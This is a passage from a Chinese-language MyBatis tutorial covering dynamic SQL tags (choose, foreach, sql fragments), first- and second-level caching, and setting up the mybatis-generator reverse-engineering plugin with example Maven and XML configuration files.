null&quot;</span>&gt;</span><br>      ename = #&#123;ename&#125;<br>      <span class="hljs-tag">&lt;/<span class="hljs-name">when</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">when</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;age != &#x27;&#x27; and age != null&quot;</span>&gt;</span><br>      age = #&#123;age&#125;<br>      <span class="hljs-tag">&lt;/<span class="hljs-name">when</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">when</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;sex != &#x27;&#x27; and sex != null&quot;</span>&gt;</span><br>      sex = #&#123;sex&#125;<br>      <span class="hljs-tag">&lt;/<span class="hljs-name">when</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">when</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;email != &#x27;&#x27; and email != null&quot;</span>&gt;</span><br>      email = #&#123;email&#125;<br>      <span class="hljs-tag">&lt;/<span class="hljs-name">when</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">choose</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">where</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="8-5-foreach">8.5 foreach</h3><blockquote><p>spearator: 以什么为分隔符<br>collection: 集合<br>item: 元素<br>open: 以什么开头<br>close: 以什么结尾</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--int insertMoreEmp(List&lt;Emp&gt; emps);--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">insert</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;insertMoreEmp&quot;</span>&gt;</span><br>  insert into t_emp values<br>  <span class="hljs-tag">&lt;<span class="hljs-name">foreach</span> <span class="hljs-attr">collection</span>=<span class="hljs-string">&quot;emps&quot;</span> <span class="hljs-attr">item</span>=<span class="hljs-string">&quot;emp&quot;</span> <span class="hljs-attr">separator</span>=<span class="hljs-string">&quot;,&quot;</span>&gt;</span><br>  (null,#&#123;emp.ename&#125;,#&#123;emp.age&#125;,#&#123;emp.sex&#125;,#&#123;emp.email&#125;,null)<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">foreach</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">insert</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--int deleteMoreByArray(int[] eids);--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">delete</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;deleteMoreByArray&quot;</span>&gt;</span><br>  delete from t_emp where<br>  <span class="hljs-tag">&lt;<span class="hljs-name">foreach</span> <span class="hljs-attr">collection</span>=<span class="hljs-string">&quot;eids&quot;</span> <span class="hljs-attr">item</span>=<span class="hljs-string">&quot;eid&quot;</span> <span class="hljs-attr">separator</span>=<span class="hljs-string">&quot;or&quot;</span>&gt;</span><br>  eid = #&#123;eid&#125;<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">foreach</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">delete</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--int deleteMoreByArray(int[] eids);--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">delete</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;deleteMoreByArray&quot;</span>&gt;</span><br>  delete from t_emp where eid in<br>  <span class="hljs-tag">&lt;<span class="hljs-name">foreach</span> <span class="hljs-attr">collection</span>=<span class="hljs-string">&quot;eids&quot;</span> <span class="hljs-attr">item</span>=<span class="hljs-string">&quot;eid&quot;</span> <span class="hljs-attr">separator</span>=<span class="hljs-string">&quot;,&quot;</span> <span class="hljs-attr">open</span>=<span class="hljs-string">&quot;(&quot;</span> <span class="hljs-attr">close</span>=<span class="hljs-string">&quot;)&quot;</span>&gt;</span><br>  #&#123;eid&#125;<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">foreach</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">delete</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="8-5-SQL片段">8.5 SQL片段</h3><blockquote><p>sql片段，可以记录一段公共sql片段，在使用的地方通过include标签进行引入</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">sql</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;empColumns&quot;</span>&gt;</span><br>eid,ename,age,sex,did<br><span class="hljs-tag">&lt;/<span class="hljs-name">sql</span>&gt;</span><br><br>select <span class="hljs-tag">&lt;<span class="hljs-name">include</span> <span class="hljs-attr">refid</span>=<span class="hljs-string">&quot;empColumns&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span> from t_emp<br></code></pre></td></tr></table></figure><h3 id="8-6-总结">8.6 总结</h3><div class="info"><p>if: 多个标签并列, 成立就会添加到sql语句中<br>choose,when,otherwise: 多个标签组合, 只会成立里面的一个并到sql语句中<br>foreach: 开头结尾阔和的闭合方式, 中间逗号隔开的方法<br>sql片段: 多用与重复的sql片段, 如 selct {字段} from, 最好不要写 *, 因为到了数据库也会在拼接成全字段, 影响效率</p></div><h2 id="10-MyBatis缓存">10. MyBatis缓存</h2><h3 id="10-1-一级缓存">10.1 一级缓存</h3><p>一级缓存是SqlSession级别的，通过同一个SqlSession查询的数据会被缓存，下次查询相同的数据，就会从缓存中直接获取，不会从数据库重新访问使一级缓存失效的四种情况：</p><ol><li class="lvl-3"><p>不同的SqlSession对应不同的一级缓存</p></li><li class="lvl-3"><p>同一个SqlSession但是查询条件不同</p></li><li class="lvl-3"><p>同一个SqlSession两次查询期间执行了任何一次增删改操作</p></li><li class="lvl-3"><p>同一个SqlSession两次查询期间手动清空了缓存</p></li></ol><h3 id="10-2-二级缓存">10.2 二级缓存</h3><p>二级缓存是SqlSessionFactory级别，通过同一个SqlSessionFactory创建的SqlSession查询的结果会被缓存；此后若再次执行相同的查询语句，结果就会从缓存中获取二级缓存开启的条件：<br>a&gt;在核心配置文件中，设置全局配置属性cacheEnabled=“true”，默认为true，不需要设置<br>b&gt;在映射文件中设置标签<cache><br>c&gt;二级缓存必须在SqlSession关闭或提交之后有效<br>d&gt;查询的数据所转换的实体类类型必须实现序列化的接口使二级缓存失效的情况：两次查询之间执行了任意的增删改，会使一级和二级缓存同时失效</cache></p><p>在mapper配置文件中添加的cache标签可以设置一些属性：<br>①eviction属性：缓存回收策略，默认的是 LRU。<br>LRU（Least Recently Used） – 最近最少使用的：移除最长时间不被使用的对象。<br>FIFO（First in First out） – 先进先出：按对象进入缓存的顺序来移除它们。<br>SOFT – 软引用：移除基于垃圾回收器状态和软引用规则的对象。<br>WEAK – 弱引用：更积极地移除基于垃圾收集器状态和弱引用规则的对象。<br>②flushInterval属性：刷新间隔，单位毫秒默认情况是不设置，也就是没有刷新间隔，缓存仅仅调用语句时刷新<br>③size属性：引用数目，正整数代表缓存最多可以存储多少个对象，太大容易导致内存溢出<br>④readOnly属性：只读， true/false<br>true：只读缓存；会给所有调用者返回缓存对象的相同实例。因此这些对象不能被修改。这提供了 很重要的性能优势。<br>false：读写缓存；会返回缓存对象的拷贝（通过序列化）。这会慢一些，但是安全，因此默认是<br>false。</p><h3 id="10-3-缓存的查询顺序">10.3 缓存的查询顺序</h3><p>先查询二级缓存，因为二级缓存中可能会有其他程序已经查出来的数据，可以拿来直接使用。如果二级缓存没有命中，再查询一级缓存如果一级缓存也没有命中，则查询数据库<br>SqlSession关闭之后，一级缓存中的数据会写入二级缓存</p><h3 id="10-4-第三方缓存EHCache">10.4 第三方缓存EHCache</h3><h3 id="10-5-总结">10.5 总结</h3><div class="info"></div><h2 id="11-MyBatis逆向工程">11. MyBatis逆向工程</h2><p>正向工程：先创建Java实体类，由框架负责根据实体类生成数据库表。 Hibernate是支持正向工程的。逆向工程：先创建数据库表，由框架负责根据数据库表，反向生成如下资源：</p><ul class="lvl-0"><li class="lvl-2"><p>Java实体类</p></li><li class="lvl-2"><p>Mapper接口</p></li><li class="lvl-2"><p>Mapper映射文件</p></li></ul><h3 id="11-1-逆向工程创建流程">11.1 逆向工程创建流程</h3><ol><li class="lvl-3"><p>添加依赖插件</p></li></ol><blockquote><p>maven的配置文件, 多添加了有关逆向工程插件</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.atguigu.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis_mbg<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.7<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- junit测试 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.12<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- log4j日志 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.17<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.16<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 控制Maven在构建过程中相关配置 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- 构建过程中用到的插件 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-comment">&lt;!-- 具体插件，逆向工程的操作是以构建过程中插件形式出现的 --&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis.generator<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-generator-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.3.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                <span class="hljs-comment">&lt;!-- 插件的依赖 --&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>                    <span class="hljs-comment">&lt;!-- 逆向工程的核心依赖 --&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis.generator<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-generator-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.3.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>                    <span class="hljs-comment">&lt;!-- MySQL驱动 --&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.16<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><ol start="2"><li class="lvl-3"><p>创建MyBatis核心配置文件</p></li></ol><blockquote><p>和平常项目一样配置文件</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">configuration</span></span><br><span class="hljs-meta">        <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">    MyBatis核心配置文件中，标签的顺序：</span><br><span class="hljs-comment">    properties?,settings?,typeAliases?,typeHandlers?,</span><br><span class="hljs-comment">    objectFactory?,objectWrapperFactory?,reflectorFactory?,</span><br><span class="hljs-comment">    plugins?,environments?,databaseIdProvider?,mappers?</span><br><span class="hljs-comment">    --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span> <span class="hljs-attr">resource</span>=<span class="hljs-string">&quot;jdbc.properties&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">settings</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--将下划线映射为驼峰形式--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">setting</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;mapUnderscoreToCamelCase&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;true&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">settings</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">typeAliases</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--&lt;typeAlias type=&quot;com.atguigu.mybatis.pojo.User&quot;&gt;&lt;/typeAlias&gt;--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">typeAliases</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">environments</span> <span class="hljs-attr">default</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">environment</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">transactionManager</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;JDBC&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;POOLED&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;driver&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.driver&#125;&quot;</span>/&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.url&#125;&quot;</span>/&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.username&#125;&quot;</span>/&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.password&#125;&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">environment</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">environments</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mappers</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--&lt;mapper resource=&quot;mappers/UserMapper.xml&quot;/&gt;--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">mappers</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br></code></pre></td></tr></table></figure><ol start="3"><li class="lvl-3"><p>创建逆向工程配置文件</p></li></ol><blockquote><p>只能叫这个名字 generatorConfig</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">generatorConfiguration</span></span><br><span class="hljs-meta">        <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">generatorConfiguration</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">    targetRuntime: 执行生成的逆向工程的版本</span><br><span class="hljs-comment">    MyBatis3Simple: 生成基本的CRUD（清新简洁版）</span><br><span class="hljs-comment">    MyBatis3: 生成带条件的CRUD（奢华尊享版）</span><br><span class="hljs-comment">    --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">context</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;DB2Tables&quot;</span> <span class="hljs-attr">targetRuntime</span>=<span class="hljs-string">&quot;MyBatis3&quot;</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- 数据库的连接信息 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">jdbcConnection</span> <span class="hljs-attr">driverClass</span>=<span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span></span><br><span class="hljs-tag">                        <span class="hljs-attr">connectionURL</span>=<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/ssm?serverTimezone=UTC&quot;</span></span><br><span class="hljs-tag">                        <span class="hljs-attr">userId</span>=<span class="hljs-string">&quot;root&quot;</span></span><br><span class="hljs-tag">                        <span class="hljs-attr">password</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">jdbcConnection</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- javaBean的生成策略--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">javaModelGenerator</span> <span class="hljs-attr">targetPackage</span>=<span class="hljs-string">&quot;com.atguigu.mybatis.pojo&quot;</span></span><br><span class="hljs-tag">                            <span class="hljs-attr">targetProject</span>=<span class="hljs-string">&quot;.\src\main\java&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;enableSubPackages&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;true&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;trimStrings&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;true&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">javaModelGenerator</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- SQL映射文件的生成策略 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">sqlMapGenerator</span> <span class="hljs-attr">targetPackage</span>=<span class="hljs-string">&quot;com.atguigu.mybatis.mapper&quot;</span></span><br><span class="hljs-tag">                         <span class="hljs-attr">targetProject</span>=<span class="hljs-string">&quot;.\src\main\resources&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;enableSubPackages&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;true&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">sqlMapGenerator</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- Mapper接口的生成策略 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">javaClientGenerator</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;XMLMAPPER&quot;</span></span><br><span class="hljs-tag">                             <span class="hljs-attr">targetPackage</span>=<span class="hljs-string">&quot;com.atguigu.mybatis.mapper&quot;</span> <span class="hljs-attr">targetProject</span>=<span class="hljs-string">&quot;.\src\main\java&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;enableSubPackages&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;true&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">javaClientGenerator</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- 逆向分析的表 